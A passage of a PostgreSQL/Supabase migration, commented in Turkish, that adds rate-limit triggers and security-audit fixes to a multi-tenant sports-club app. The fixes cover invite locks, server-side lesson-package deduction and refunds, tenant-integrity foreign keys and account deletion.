-- SECURITY DEFINER: private.istek_sayaci'ya normal kullanıcının yazma yetkisi
-- yok ve olmamalı.
-- VOLATILE (varsayılan): fonksiyon yazma yapıyor, stable/immutable işaretlenirse
-- planlayıcı çağrıyı eleyebilir ve sınır sessizce çalışmaz hale gelirdi.
create or replace function private.hiz_kontrol(
  p_eylem   text,
  p_azami   int,
  p_pencere interval,
  p_mesaj   text default null
)
returns void
language plpgsql
security definer
set search_path = public
as $$
declare
  v_anahtar text := p_eylem || ':' || private.istek_kimligi();
  -- Pencere başlangıcı: zamanı pencere boyuna yuvarla. Böylece aynı pencereye
  -- düşen tüm istekler TEK satırda toplanır (tablo şişmez).
  v_pencere timestamptz := to_timestamp(
    floor(extract(epoch from now()) / extract(epoch from p_pencere)) * extract(epoch from p_pencere)
  );
  v_adet int;
begin
  insert into private.istek_sayaci (anahtar, pencere, adet)
  values (v_anahtar, v_pencere, 1)
  on conflict (anahtar, pencere) do update
     set adet = private.istek_sayaci.adet + 1
  returning adet into v_adet;

  if v_adet > p_azami then
    raise exception '%', coalesce(
      p_mesaj,
      'Çok fazla istek gönderdiniz. Lütfen biraz bekleyip tekrar deneyin.'
    ) using errcode = 'check_violation';
  end if;

  -- FIRSATÇI TEMİZLİK: ayrı bir zamanlanmış iş kurmamak için, isteklerin küçük
  -- bir kısmında (yaklaşık %1) eski pencereler siliniyor. pg_cron'a bağımlılık
  -- yaratmadan tablonun sınırsız büyümesini engelliyor.
  -- mod(adet, 100) kullanılıyor çünkü random() bu fonksiyonu daha da volatile
  -- yapar ve testte davranışı öngörülemez kılar.
  if mod(v_adet, 100) = 0 then
    delete from private.istek_sayaci where pencere < now() - interval '1 day';
  end if;
end;
$$;

grant execute on function private.istek_kimligi() to authenticated;
grant execute on function private.hiz_kontrol(text, int, interval, text) to authenticated;


-- ===========================================================================
-- 3) TETİKLEYİCİLER
-- ===========================================================================
-- POLİTİKA DEĞİL TETİKLEYİCİ kullanılıyor: RLS politikaları yan etkisiz
-- olmalıdır (planlayıcı bir politikayı satır başına birden çok kez
-- değerlendirebilir), sayaç artırmak ise yan etkidir. Tetikleyici bu iş için
-- doğru yer.
--
-- Sınırlar CÖMERT seçildi. Amaç normal kullanıcıyı hiç görmediği bir duvara
-- toslatmak değil, otomatik kötüye kullanımı durdurmak. Gerçek kullanımda bu
-- sayılara yaklaşmak zor: bir veli 5 dakikada 30 mesaj yazmaz.

-- --- 3.1 Mesaj: 5 dakikada 30
create or replace function public.hiz_mesaj()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  perform private.hiz_kontrol('mesaj', 30, interval '5 minutes',
    'Çok hızlı mesaj gönderiyorsunuz. Birkaç dakika bekleyip tekrar deneyin.');
  return new;
end $$;

drop trigger if exists on_mesaj_hiz on public.mesaj;
create trigger on_mesaj_hiz before insert on public.mesaj
  for each row execute procedure public.hiz_mesaj();

-- --- 3.2 Şikâyet: saatte 5
-- Şikâyet spam'i yöneticinin ekranını doldurup gerçek şikâyeti görünmez yapar.
create or replace function public.hiz_sikayet()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  perform private.hiz_kontrol('sikayet', 5, interval '1 hour',
    'Kısa sürede çok fazla şikâyet gönderdiniz. Lütfen bir süre sonra tekrar deneyin.');
  return new;
end $$;

drop trigger if exists on_sikayet_hiz on public.sikayet;
create trigger on_sikayet_hiz before insert on public.sikayet
  for each row execute procedure public.hiz_sikayet();

-- --- 3.3 Başvuru: saatte 10
create or replace function public.hiz_basvuru()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  perform private.hiz_kontrol('basvuru', 10, interval '1 hour',
    'Kısa sürede çok fazla başvuru oluşturdunuz. Lütfen bir süre sonra tekrar deneyin.');
  return new;
end $$;

drop trigger if exists on_basvuru_hiz on public.basvuru;
create trigger on_basvuru_hiz before insert on public.basvuru
  for each row execute procedure public.hiz_basvuru();

-- --- 3.4 Davet: KULÜP BAŞINA saatte 40
--
-- BU EN ÖNEMLİSİ VE TEK KİRACI BAZLI OLANI.
-- Davet e-postaları Supabase projesinin ORTAK e-posta kotasından harcanıyor.
-- Tek bir kulübün (kötü niyetle ya da yanlışlıkla) yüzlerce davet üretmesi,
-- kotayı bitirip DİĞER TÜM KULÜPLERİN davetlerini durdurur — çok kiracılı bir
-- üründe bir müşterinin diğerlerini etkileyebildiği ender yerlerden biri.
-- Bu yüzden anahtar kullanıcı değil KULÜP.
create or replace function public.hiz_davet()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  perform private.hiz_kontrol('davet:' || coalesce(new.kulup_id::text, 'yok'), 40, interval '1 hour',
    'Bu kulüp için kısa sürede çok fazla davet oluşturuldu. Lütfen bir saat sonra tekrar deneyin.');
  return new;
end $$;

drop trigger if exists on_davet_hiz on public.davet;
create trigger on_davet_hiz before insert on public.davet
  for each row execute procedure public.hiz_davet();

-- --- 3.5 Engelleme: saatte 30
create or replace function public.hiz_engelleme()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  perform private.hiz_kontrol('engelleme', 30, interval '1 hour',
    'Kısa sürede çok fazla işlem yaptınız. Lütfen bir süre sonra tekrar deneyin.');
  return new;
end $$;

drop trigger if exists on_engelleme_hiz on public.engelleme;
create trigger on_engelleme_hiz before insert on public.engelleme
  for each row execute procedure public.hiz_engelleme();


-- ===========================================================================
-- 4) DOĞRULAMA
-- ===========================================================================
--   -- Sayaç çalışıyor mu?
--   select private.hiz_kontrol('deneme', 2, interval '1 minute');  -- 1
--   select private.hiz_kontrol('deneme', 2, interval '1 minute');  -- 2
--   select private.hiz_kontrol('deneme', 2, interval '1 minute');  -- HATA
--
--   -- Kimlik nasıl çözülüyor?
--   select private.istek_kimligi();   -- SQL Editor'da 'bilinmeyen' (IP yok)
--
--   -- Sayaç tablosu:
--   select anahtar, pencere, adet from private.istek_sayaci order by pencere desc;
--
-- ⚠ BU MIGRATION'IN KAPSAMADIĞI, SUPABASE PANELİNDEN AYARLANMASI GEREKENLER:
--   Dashboard > Authentication > Rate Limits
--     · Sign in / Sign up   — IP başına kayıt ve giriş denemesi
--     · Token verifications — e-posta bağlantısı doğrulama
--     · Email sent          — davet ve sıfırlama e-postası (özel SMTP şart)
--   Dashboard > Authentication > Attack Protection
--     · CAPTCHA (hCaptcha veya Cloudflare Turnstile) — otomatik kayıt
--       denemelerine karşı en güçlü önlem. Ücretsiz hesap gerektiriyor.
-- ===========================================================================



-- ===========================================================================
-- 21) GUVENLIK DENETIMI DUZELTMELERI
--     Kaynak: 0037
-- ===========================================================================
-- Periyodik guvenlik denetiminin OLCEREK buldugu uc acik: yonetici daveti
-- kilidinin iki ayri baypasi, on odemeli paket dususunun sunucuda hic
-- dogrulanmamasi, ve hesabimi_sil()in odeme kaydi olan hesapta patlamasi.

drop policy if exists "davet: yönetici kendi kulübünün davetlerini yönetir" on public.davet;
create policy "davet: yönetici kendi kulübünün davetlerini yönetir" on public.davet for all
  using (private.current_profile_role() = 'yonetici')
  with check (
    private.current_profile_role() = 'yonetici'
    and (
      -- Yönetici olmayan roller serbest.
      rol <> 'yonetici'
      -- Yönetici rolü yalnızca kilidi AÇILMIŞ kulüpte.
      or coalesce(
           (select k.yonetici_davet_kilitli from public.kulup k where k.id = davet.kulup_id),
           true
         ) = false
    )
  );

create or replace function public.protect_yonetici_daveti()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_kilitli   boolean;
  v_olusturan app_role;
begin
  -- 0040: ROL DEĞİŞMEYEN UPDATE'LER ERKEN ÇIKAR.
  -- Tetikleyici `before insert or update` olduğu için davet satırının HER
  -- UPDATE'inde çalışıyordu — kaydın tüketildiği andaki mühür UPDATE'i dahil
  -- (handle_new_user içindeki `update davet set kullanildi_at`). O anda kural
  -- sıfırdan değerlendiriliyor ve davet oluşturulduğunda geçerli olan durum
  -- artık geçerli değilse KAYIT TAMAMEN DÜŞÜYOR; auth.users INSERT'iyle aynı
  -- transaction'da olduğu için hesap hiç açılmıyordu.
  -- Baypas açmıyor: rolü 'yonetici'ye ÇEVİREN UPDATE rol değiştiği için hâlâ
  -- yakalanıyor, RLS WITH CHECK katmanı da INSERT+UPDATE'te yerinde duruyor.
  if TG_OP = 'UPDATE' and new.rol is not distinct from old.rol then
    return new;
  end if;

  if new.rol <> 'yonetici' then
    return new;
  end if;

  select k.yonetici_davet_kilitli into v_kilitli
    from public.kulup k where k.id = new.kulup_id;

  if coalesce(v_kilitli, true) = false then
    return new;
  end if;

  -- DENENİP KALDIRILAN KONTROL: "olusturan_id auth.uid() olmalı".
  -- Amacı (b) deliğine ikinci bir kapak koymaktı ama PLATFORM KONSOLUNU
  -- KİLİTLİYOR: service_role isteği bir kullanıcı JWT'si taşıyorsa auth.uid()
  -- dolu olur, olusturan_id ise platform_admin'dir ve eşleşmez. Testte tam
  -- olarak bu oldu — kontrol eklendiği turda konsol kilitlendi.
  --
  -- Kaldırılabilmesinin sebebi: koruduğu senaryoyu RLS ZATEN kapatıyor.
  -- Kilitli bir kulüpte authenticated bir istek rol='yonetici' satırını ne
  -- INSERT ne UPDATE edebiliyor — olusturan_id'ye ne yazdığından bağımsız.
  -- Kilit açıksa yönetici daveti zaten serbest; sahtecilikten kazanılan bir
  -- şey yok.
  -- ⚠ Bölüm 1'deki RLS politikası gevşetilirse bu kapak geri gerekir.

  select p.role into v_olusturan
    from public.profiles p where p.id = new.olusturan_id;

  if v_olusturan = 'platform_admin' then
    return new;
  end if;

  raise exception 'Yönetici hesapları yalnızca yazılım sağlayıcısı tarafından açılabilir. Yeni yönetici için sağlayıcınızla iletişime geçin.'
    using errcode = 'insufficient_privilege';
end;
$$;

-- (a) DÜZELTMESİ: UPDATE de kapsanıyor.
drop trigger if exists on_davet_yonetici_kontrol on public.davet;
create trigger on_davet_yonetici_kontrol
  before insert or update on public.davet
  for each row execute procedure public.protect_yonetici_daveti();


-- ===========================================================================
-- 2) F2 — ÖN ÖDEMELİ PAKET DÜŞÜMÜ SUNUCUDA DOĞRULANMIYORDU
-- ===========================================================================
-- 0036 TUTARI sunucuya taşıdı ama HAKKIN VAR OLUP OLMADIĞINI taşımadı.
-- Paketten düşme işlemi istemcide, rezervasyondan AYRI bir istekte yapılıyordu
-- (bireyselRepo: önce insert, sonra `update bireysel_paket set kalan`).
-- İstemci ikinci isteği atlayabiliyordu.
--
-- Ölçüldü: 3 paket rezervasyonu açıldı, kalan 6'da kaldı; paket tükendikten
-- sonra (kalan = 0) bile geçti. Sonuç: veli bir kez paket alır, sınırsız ders
-- rezerve eder; her ders antrenörün hakedişine girer. Kulüp tahsil etmediği
-- dersi verir ve üstüne pay öder.
--
-- ÇÖZÜM: DÜŞÜM REZERVASYONLA AYNI İŞLEMDE, SUNUCUDA.
--   Tek transaction, `for update` ile satır kilidi — eşzamanlı iki rezervasyon
--   aynı son dersi kullanamıyor. İstemcinin atlayabileceği bir adım kalmıyor.
create or replace function public.paket_dus()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_kalan   int;
  v_sporcu  uuid;
  v_ant     uuid;
begin
  if new.odeme_tipi <> 'paket' then
    return new;
  end if;

  if new.paket_id is null then
    raise exception 'Paket dersi için paket seçilmedi.';
  end if;

  -- FOR UPDATE: satırı kilitle. Kilitsiz okunsaydı iki eşzamanlı rezervasyon
  -- aynı "kalan = 1" değerini görüp ikisi de geçerdi.
  select bp.kalan, bp.sporcu_id, bp.antrenor_id
    into v_kalan, v_sporcu, v_ant
    from public.bireysel_paket bp
   where bp.id = new.paket_id
     for update;

  if v_kalan is null then
    raise exception 'Paket bulunamadı.';
  end if;

  -- PAKET BU SPORCUNUN MU? paket_id'de sporcuya bağlayan bir FK yoktu; başka
  -- bir sporcunun paketini göstererek ders almak mümkündü.
  if v_sporcu is distinct from new.sporcu_id then
    raise exception 'Bu paket bu sporcuya ait değil.';
  end if;

  -- PAKET BU ANTRENÖRÜN MÜ? Paket belirli bir antrenörle alınıyor; başka bir
  -- antrenörün dersine saydırmak paketin anlamını bozar.
  if v_ant is not null and v_ant is distinct from new.antrenor_id then
    raise exception 'Bu paket başka bir antrenör için alınmış.';
  end if;

  if v_kalan <= 0 then
    raise exception 'Paketinizde kalan ders yok.';
  end if;

  update public.bireysel_paket set kalan = v_kalan - 1 where id = new.paket_id;
  return new;
end;
$$;

-- AFTER INSERT (0044) — BEFORE DEĞİL. BEFORE INSERT tetikleyicileri, satır
-- ÇATIŞMA NEDENİYLE HİÇ YAZILMASA BİLE çalışır: `insert ... on conflict do
-- nothing` (PostgREST'in "Prefer: resolution=ignore-duplicates" başlığı bunu
-- üretir) gönderildiğinde paket düşüyor ama rezervasyon oluşmuyordu.
-- ÖLÇÜLDÜ: kalan 4 -> 3, yeni satır YOK. Velinin ödediği ders sessizce yanıyordu.
-- AFTER'da tetikleyici yalnızca gerçekten yazılan satır için çalışır; `for
-- update` kilidi aynı transaction içinde alındığı için eşzamanlılık garantisi
-- değişmiyor ve fonksiyon NEW'i değiştirmediği için BEFORE olması gerekmiyordu.
drop trigger if exists on_rezervasyon_paket_dus on public.bireysel_rezervasyon;
create trigger on_rezervasyon_paket_dus
  after insert on public.bireysel_rezervasyon
  for each row execute procedure public.paket_dus();

-- İADE: ders verilmediyse hak geri gelmeli.
-- Antrenör reddederse ya da rezervasyon iptal edilirse veli dersini
-- kaybetmemeli. ÇİFT İADE KORUMASI: yalnızca iade edilmemiş bir durumdan
-- iade edilen bir duruma GEÇİŞTE çalışıyor.
create or replace function public.paket_iade()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
begin
  if new.odeme_tipi <> 'paket' or new.paket_id is null then
    return new;
  end if;

  if new.durum in ('reddedildi', 'iptal')
     and old.durum not in ('reddedildi', 'iptal')
     -- ===================================================================
     -- İADE KAPISI (0040 → 0041)
     -- ===================================================================
     -- 0040 buraya düz `new.tarih > current_date` koymuştu. Gerekçe doğruydu
     -- (verilmiş ders iade edilmemeli: veli derse gider, antrenör
     -- 'tamamlandi' işaretlemeden iptal eder, hak geri gelirdi — ölçüldü
     -- 5 → 4 → 5), ama koşul BLOĞUN TAMAMINA uygulandığı için ANTRENÖRÜN
     -- "Reddet" düğmesini de vuruyordu:
     --   veli bugüne rezervasyon açar (kalan 5→4) → antrenör reddeder
     --   (ders hiç onaylanmadı, hiç verilmedi) → kalan 4'te kalır.
     -- Hata dönmüyordu. Veli hakkını sessizce kaybediyor, rezervasyon
     -- 'reddedildi' olduğu için kulüp de tahsil etmiyordu — para tek taraflı
     -- kayboluyordu. 0040'ın kapattığı sömürünün tam aynadaki hâli.
     --
     -- 0041 koşulu TARİHE DEĞİL "DERS TÜKETİLDİ Mİ"YE bağlıyor:
     --   · old.durum = 'onay_bekliyor' → hiç onaylanmadı = hiç verilmedi.
     --     Tarihi ne olursa olsun iade edilir; antrenörün reddi bu dala düşer.
     --   · aksi hâlde onaylanmış ders yalnızca GELECEKTEYSE iade edilir.
     --
     -- least(old.tarih, new.tarih) ŞART: 0040 yalnız new.tarih'e bakıyordu ve
     -- tek UPDATE'te `set tarih = current_date + 5, durum = 'iptal'` yazarak
     -- geçmiş dersin iadesi koparılabiliyordu (yönetici yolu; veli ve antrenör
     -- tarihi zaten protect_bireysel_rezervasyon yüzünden değiştiremiyor).
     --
     -- Yalnızca `new.durum = 'reddedildi'` muafiyeti DAHA ZAYIF olurdu:
     -- antrenör verdiği geçmiş dersi 'reddedildi' işaretleyip veliyle
     -- anlaşarak iade üretebilirdi. old.durum şartı bunu kesiyor.
     and (
       old.durum = 'onay_bekliyor'
       or least(old.tarih, new.tarih) > current_date
     ) then
    -- kalan, toplam'ı aşmasın: bozuk bir veri düzeltmesi paketi şişirmesin.
    update public.bireysel_paket
       set kalan = least(kalan + 1, toplam)
     where id = new.paket_id;
  end if;

  return new;
end;
$$;

drop trigger if exists on_rezervasyon_paket_iade on public.bireysel_rezervasyon;
create trigger on_rezervasyon_paket_iade
  after update on public.bireysel_rezervasyon
  for each row execute procedure public.paket_iade();


-- ---------------------------------------------------------------------------
-- DİRİLTME DÜŞÜMÜ  (0041)
-- ---------------------------------------------------------------------------
-- `paket_dus` yalnızca BEFORE INSERT'te çalışıyor. Bir rezervasyon iptal edilip
-- (iade +1) sonra tekrar aktif duruma çekilirse YENİDEN DÜŞÜM OLMUYORDU, ama her
-- yeni iptal `paket_iade`'yi tekrar ateşliyordu.
-- ÖLÇÜLDÜ: iptal→onaylandi→iptal döngüsü kalan'ı 5→6→7→8→9→10 yaptı; sonuçta
-- toplam=10, kalan=10 ve 5 aktif rezervasyon → fiilen 15 derslik hak.
-- Yapabilen: yönetici (veli ve antrenör diriltemiyor — RLS engelliyor).
create or replace function public.paket_dirilt()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_kalan int;
begin
  if new.odeme_tipi <> 'paket' or new.paket_id is null then
    return new;
  end if;

  -- İADE SETİNDEN ÇIKIŞ = hak yeniden tüketiliyor. Koşul `paket_iade`'nin
  -- AYNASI olmak zorunda: iade, iade setine GİRİŞTE +1 yapıyor; düşüm de
  -- setten ÇIKIŞTA -1 yapmalı.
  -- ⚠ 0041 buraya `new.durum in ('onay_bekliyor','onaylandi')` yazmıştı ve
  --   'tamamlandi'/'gelmedi' hedefleri düşümsüz geçiyordu. ÖLÇÜLDÜ (0044):
  --   iptal→tamamlandi→iptal→gelmedi→iptal… her tur +1 üretiyordu (kalan
  --   5→6→7→9, rezervasyon hâlâ ayakta). Hedef durumları tek tek saymak yerine
  --   "iade setinde değil" demek, ileride yeni bir durum eklendiğinde deliği
  --   kendiliğinden kapatır.
  if old.durum in ('reddedildi', 'iptal')
     and new.durum not in ('reddedildi', 'iptal') then

    select kalan into v_kalan
      from public.bireysel_paket
     where id = new.paket_id
       for update;                      -- paket_dus ile aynı kilit deseni

    if coalesce(v_kalan, 0) <= 0 then
      raise exception 'Pakette kalan ders hakkı yok; rezervasyon yeniden aktifleştirilemez.'
        using errcode = 'check_violation';
    end if;

    update public.bireysel_paket
       set kalan = kalan - 1
     where id = new.paket_id;
  end if;

  return new;
end;
$$;

drop trigger if exists on_rezervasyon_paket_dirilt on public.bireysel_rezervasyon;
create trigger on_rezervasyon_paket_dirilt
  before update on public.bireysel_rezervasyon
  for each row execute procedure public.paket_dirilt();


-- ---------------------------------------------------------------------------
-- BİREYSEL DERSTE KİRACI BÜTÜNLÜĞÜ  (0041)
-- ---------------------------------------------------------------------------
-- `antrenor_id` kolonları yalnızca `profiles(id)`'ye bakıyordu — "böyle bir kişi
-- var mı" diye soruyor, "BENİM kulübümün antrenörü mü" diye sormuyordu. 0038'in
-- `sube_id` için kurduğu bileşik FK deseni buraya uygulanmamıştı.
--
-- ÖLÇÜLDÜ (A kulübü velisinin gerçek JWT'siyle):
--   · B kulübünün antrenörüne rezervasyon açıldı → başarılı.
--   · FİYAT SIZDI: veli `bireysel_antrenor`'da 0 satır görüyor ama rezervasyona
--     yazılan tutar B'nin gerçek tek_fiyat'ı — `rezervasyon_fiyatla` SECURITY
--     DEFINER olduğu için kiracı duvarının arkasından kopyalıyor.
--   · TAKVİM KİLİTLENDİ: slot benzersizliği kiracı kırılımsızdı; B'nin
--     antrenörünün saati işgal ediliyor ve engelleyen satırı B tarafı ne
--     görebiliyor ne silebiliyordu.
--
-- Gereken benzersizlik `profiles(id, kulup_id)` üzerinde zaten var.
-- ⚠ `on delete set null (antrenor_id)` — kolon listeli biçim ŞART: kolonsuz
--    SET NULL bileşik FK'nin TÜM kolonlarını (kulup_id dahil) NULL yapmaya
--    çalışır ve NOT NULL kısıtına takılır (0038/0039'da yaşandı).
alter table bireysel_rezervasyon drop constraint if exists bireysel_rezervasyon_antrenor_id_fkey;
alter table bireysel_rezervasyon add  constraint bireysel_rezervasyon_antrenor_kulup_fkey
  foreign key (antrenor_id, kulup_id) references profiles(id, kulup_id)
  on delete set null (antrenor_id);

alter table bireysel_paket drop constraint if exists bireysel_paket_antrenor_id_fkey;
alter table bireysel_paket add  constraint bireysel_paket_antrenor_kulup_fkey
  foreign key (antrenor_id, kulup_id) references profiles(id, kulup_id)
  on delete set null (antrenor_id);

-- bireysel_antrenor.antrenor_id NOT NULL: SET NULL kullanılamaz, CASCADE korunuyor
-- (profil silinirse ücret satırı da anlamsızlaşır).
alter table bireysel_antrenor drop constraint if exists bireysel_antrenor_antrenor_id_fkey;
alter table bireysel_antrenor add  constraint bireysel_antrenor_antrenor_kulup_fkey
  foreign key (antrenor_id, kulup_id) references profiles(id, kulup_id)
  on delete cascade;

-- SLOT BENZERSİZLİĞİ KİRACIYA GÖRE. Bileşik FK yabancı antrenöre rezervasyonu
-- zaten reddediyor; bu indeks ikinci katman ve doğru olanı ifade ediyor:
-- bir saat, BİR KULÜBÜN antrenörü için tekildir.
drop index if exists public.bireysel_rezervasyon_slot_uniq;
create unique index if not exists bireysel_rezervasyon_slot_uniq
  on bireysel_rezervasyon (kulup_id, antrenor_id, tarih, saat)
  where durum <> all (array['reddedildi'::text, 'iptal'::text]);


-- ---------------------------------------------------------------------------
-- service_role, private.current_profile_role() ÇALIŞTIRABİLMELİ  (0041)
-- ---------------------------------------------------------------------------
-- ÖLÇÜLDÜ: izin yoktu ve bu fonksiyonu çağıran her tetikleyici
-- (protect_antrenor_ucret, protect_bireysel_rezervasyon…) service_role isteğini
-- `permission denied for function current_profile_role` ile düşürüyordu. Yani
-- service_role bu tablolarda HİÇ UPDATE yapamıyordu. Panel service_role
-- istemcisi kullanıyor; bu tablolara yazan bir ekran eklendiği gün sessizce
-- patlardı.
-- GÜVENLİK ETKİSİ YOK: fonksiyon yalnızca ÇAĞIRANIN kendi rolünü döndürüyor,
-- parametre almıyor; service_role zaten RLS'i baypas ediyor.
grant execute on function private.current_profile_role() to service_role;


-- ---------------------------------------------------------------------------
-- paket_id / sporcu_id KİRACI BÜTÜNLÜĞÜ + PAKET BAĞLILIĞI  (0044)
-- ---------------------------------------------------------------------------
-- 0041 antrenor_id için bileşik FK kurdu, paket_id'yi atladı. paket_id düz FK
-- olduğu ve `paket_iade`/`paket_dirilt` SECURITY DEFINER (RLS baypas) olduğu
-- için bir kulübün yöneticisi BAŞKA KULÜBÜN paketine yazabiliyordu.
-- ÖLÇÜLDÜ (A yöneticisinin gerçek JWT'si, B'nin paketi kalan=8):
--   select ... from bireysel_paket where id = <B paketi>  -> 0 satır (RLS sağlam)
--   update bireysel_rezervasyon set paket_id = <B paketi> -> UPDATE 1 (duvar yok)
--   tarih geçmişe çekilip iptal↔onaylandi döngüsü          -> B'nin kalanı 8 -> 6
-- Kurbanın tarafında hiçbir iz yok: rezervasyon satırı A kulübünde.
--
-- KATMAN: kiracı bütünlüğü güvenlik değişmezi -> FK (herkesi bağlar:
-- veli, yönetici, service_role, postgres). RLS seçilseydi service_role yolu ve
-- tetikleyicilerin DEFINER gövdesi muaf kalırdı.
-- ⚠ SIRA: FK önce düşürülür — benzersizlik indeksine bağlı bir FK varken
--   `drop constraint` "other objects depend on it" hatası verir (ölçüldü).
alter table bireysel_rezervasyon drop constraint if exists bireysel_rezervasyon_paket_id_fkey;
alter table bireysel_rezervasyon drop constraint if exists bireysel_rezervasyon_paket_kulup_fkey;

alter table bireysel_paket drop constraint if exists bireysel_paket_id_kulup_uniq;
alter table bireysel_paket add  constraint bireysel_paket_id_kulup_uniq unique (id, kulup_id);

-- ON DELETE bilinçli olarak NO ACTION (düz FK ile aynı davranış): paketi silmek
-- rezervasyonu sessizce koparmamalı.
alter table bireysel_rezervasyon add  constraint bireysel_rezervasyon_paket_kulup_fkey
  foreign key (paket_id, kulup_id) references bireysel_paket(id, kulup_id);

-- sporcu_id: şemadaki diğer TÜM sporcu bağları (veli_sporcu, sporcu_antrenor,
-- servis_sporcu, etkinlik_katilim, mac_kadro_sporcu) bileşik; bu iki tablo
-- istisna kalmıştı.
alter table bireysel_rezervasyon drop constraint if exists bireysel_rezervasyon_sporcu_id_fkey;
alter table bireysel_rezervasyon add  constraint bireysel_rezervasyon_sporcu_kulup_fkey
  foreign key (sporcu_id, kulup_id) references sporcular(id, kulup_id) on delete cascade;

alter table bireysel_paket drop constraint if exists bireysel_paket_sporcu_id_fkey;
alter table bireysel_paket add  constraint bireysel_paket_sporcu_kulup_fkey
  foreign key (sporcu_id, kulup_id) references sporcular(id, kulup_id) on delete cascade;

-- KULÜP İÇİ BAĞLILIK — FK ile ifade edilemez (iki tablo arasında değer
-- eşitliği). `paket_dus` bu üç bağı yalnızca INSERT'te doğruluyordu; yönetici
-- `protect_bireysel_rezervasyon`'dan muaf olduğu için UPDATE ile paket_id /
-- sporcu_id / antrenor_id'yi serbestçe değiştirip X çocuğunun paketinden Y
-- çocuğunun dersini düşürebiliyordu.
-- ⚠ new.antrenor_id is not null ŞART: antrenör profili silindiğinde FK
--   "on delete set null (antrenor_id)" bir UPDATE üretir; koşul olmasaydı bu
--   tetikleyici hesap silmeyi kırardı (0038/0039'da yaşanan sınıf).
create or replace function public.protect_rezervasyon_paket_baglilik()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_sporcu uuid;
  v_ant    uuid;
begin
  if new.paket_id is null then
    return new;
  end if;

  if new.paket_id     is not distinct from old.paket_id
     and new.sporcu_id   is not distinct from old.sporcu_id
     and new.antrenor_id is not distinct from old.antrenor_id then
    return new;
  end if;

  select bp.sporcu_id, bp.antrenor_id into v_sporcu, v_ant
    from public.bireysel_paket bp where bp.id = new.paket_id;

  if v_sporcu is null then
    raise exception 'Paket bulunamadı.';
  end if;

  if v_sporcu is distinct from new.sporcu_id then
    raise exception 'Bu paket bu sporcuya ait değil.';
  end if;

  if v_ant is not null and new.antrenor_id is not null
     and v_ant is distinct from new.antrenor_id then
    raise exception 'Bu paket başka bir antrenör için alınmış.';
  end if;

  return new;
end;
$$;

-- AD SIRASI ÖNEMLİ: aynı zamanlamadaki tetikleyiciler ada göre çalışır.
-- "...paket_baglilik" < "...paket_dirilt" olduğu için doğrulama düşümden önce
-- çalışır; geçersiz bir paket_id ile kalan azaltılmaz.
drop trigger if exists on_rezervasyon_paket_baglilik on public.bireysel_rezervasyon;
create trigger on_rezervasyon_paket_baglilik
  before update on public.bireysel_rezervasyon
  for each row execute procedure public.protect_rezervasyon_paket_baglilik();


-- İSTEMCİNİN PAKET YAZMA YETKİSİ KALDIRILIYOR.
-- Bu politika yalnızca istemci tarafındaki düşümü ayakta tutmak için vardı;
-- düşüm artık sunucuda. Politika kalsaydı veli `kalan` alanını doğrudan
-- yükseltebilirdi — düşümü sunucuya taşımanın anlamı kalmazdı.
drop policy if exists "bireysel_paket: veli kendi sporcusunun paketini günceller" on public.bireysel_paket;


-- ===========================================================================
-- 3) F3 — hesabimi_sil() ÖDEME KAYDI OLAN HESAPTA PATLIYORDU
-- ===========================================================================
-- odeme.olusturan_id boşaltılacaklar listesinde yoktu; FK'si NO ACTION olduğu
-- için ödeme kaydeden bir yönetici/muhasebeci hesabını silemiyordu (23503).
-- Apple 5.1.1(v) o hesaplar için fiilen çalışmıyordu.
--
-- LİSTE ARTIK ELLE TUTULMUYOR. 0029'un kendi notu bu hatanın tekrar edeceğini
-- söylüyordu: yeni bir kişi-bağı kolonu eklendiğinde listeye yazmayı unutmak
-- işlevi sessizce kırıyor. Aşağıdaki döngü profiles'a NO ACTION ile bağlı
-- NULLABLE her kolonu pg_constraint'ten bulup boşaltıyor — yani şema büyüdükçe
-- kendini güncelliyor.
create or replace function public.hesabimi_sil()
returns void
language plpgsql
security definer
set search_path = public
as $$
declare
  v_id    uuid := auth.uid();
  v_rol   app_role;
  v_kulup uuid;
  v_diger int;
  r       record;
begin
  if v_id is null then
    raise exception 'Oturum bulunamadı.';
  end if;

  select p.role, p.kulup_id into v_rol, v_kulup
    from public.profiles p where p.id = v_id;

  if v_rol is null then
    raise exception 'Profil bulunamadı.';
  end if;

  if v_rol = 'yonetici' then
    select count(*) into v_diger
      from public.profiles
     where role = 'yonetici' and kulup_id = v_kulup and aktif and id <> v_id;

    if v_diger = 0 then
      raise exception 'Kulübün tek yöneticisi olduğunuz için hesabınız silinemiyor. Önce başka bir yönetici davet edin, sonra tekrar deneyin.';
    end if;
  end if;

  -- --- Kişiye ait bağlar ---------------------------------------------------
  delete from public.push_token      where user_id = v_id;
  delete from public.veli_sporcu     where veli_id = v_id;
  delete from public.sporcu_antrenor where antrenor_id = v_id;
  delete from public.konusma         where veli_id = v_id or antrenor_id = v_id;
  delete from public.engelleme       where engelleyen_id = v_id or engellenen_id = v_id;
  delete from public.davet           where olusturan_id = v_id and kullanildi_at is null;

  -- --- Kulübe ait kayıtlarda kişi bağını boşalt ----------------------------
  -- profiles'a NO ACTION ('a') ile bağlı ve NULLABLE olan her kolon.
  -- Elle liste tutmak yerine şemadan türetiliyor (yukarıdaki gerekçe).
  for r in
    select c.relname as tablo, a.attname as kolon
      from pg_constraint fk
      join pg_class     c on c.oid = fk.conrelid
      join pg_namespace n on n.oid = c.relnamespace
      join pg_attribute a on a.attrelid = fk.conrelid and a.attnum = fk.conkey[1]
     where fk.contype = 'f'
       and fk.confrelid = 'public.profiles'::regclass
       and fk.confdeltype = 'a'          -- NO ACTION: cascade/set null zaten kendi halleder
       and array_length(fk.conkey, 1) = 1
       and not a.attnotnull              -- NOT NULL kolona NULL yazılamaz
       and n.nspname = 'public'
  loop
    execute format('update public.%I set %I = null where %I = $1', r.tablo, r.kolon, r.kolon)
      using v_id;
  end loop;

  -- --- BİLEREK SİLİNMEYEN: sporcular.veli_ad / veli_telefon / veli_yakinlik
  -- Çocuk kulübe kayıtlı olduğu sürece kulübün acil durumda ulaşabileceği bir
  -- iletişim bilgisine ihtiyacı var. Bu tercih kullanıcıya açıkça söyleniyor
